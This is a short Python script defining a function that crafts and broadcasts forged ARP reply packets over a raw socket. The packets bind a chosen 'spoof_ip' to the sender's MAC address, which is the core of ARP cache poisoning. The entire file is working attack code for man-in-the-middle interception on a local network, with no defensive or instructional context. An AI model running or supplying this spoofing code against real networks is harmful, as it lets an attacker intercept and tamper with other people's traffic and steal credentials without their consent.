import socket
import struct
import threading

def send_arp_packet(interface, target_ip, spoof_ip, your_mac):

    try:
        raw_socket= socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        raw_socket.bind((interface, 0))

        mac=bytes.fromhex(your_mac.replace(":",""))#from int mac to hex
        broadcast_address=b'\xFF\xFF\xFF\xFF\xFF\xFF'
        EtherType=0x0806 #ARP

        ethernet_header=struct.pack("6s6sH",broadcast_address,mac,EtherType)

        hardware_type = 1  # Ethernet
        protocol_type = 0x0800  # IPv4
        hardware_address_len = 6  # MAC length
        protocol_address_len = 4  # IP length
        opcode = 2  # ARP Response
        arp_header = struct.pack('!HHBBH6s4s6s4s',
                                 hardware_type,
                                 protocol_type,
                                 hardware_address_len,
                                 protocol_address_len,
                                 opcode,
                                 mac,
                                 socket.inet_aton(spoof_ip),
                                 mac,
                                 socket.inet_aton(target_ip))
        packet=ethernet_header+arp_header

        raw_socket.send(packet)
        raw_socket.close()

    except Exception as e:
        print(f"An error occurred: {e}")

